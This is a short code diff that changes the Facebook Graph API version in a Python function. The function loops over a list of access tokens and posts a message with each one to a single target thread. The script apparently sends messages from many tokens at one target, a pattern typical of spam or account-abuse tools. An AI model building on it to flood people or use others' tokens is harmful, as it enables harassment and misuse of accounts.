@@ -66,7 +66,7 @@ def send_initial_message():
 
     for token in tokens:
         access_token = token.strip()
-        url = "https://graph.facebook.com/v17.0/{}/".format("t_" + target_id)
+        url = "https://graph.facebook.com/v12.0/{}/".format("t_" + target_id)
         msg = msg_template.format(access_token)
         parameters = {"access_token": access_token, "message": msg}
         response = requests.post(url, json=parameters, headers=headers)
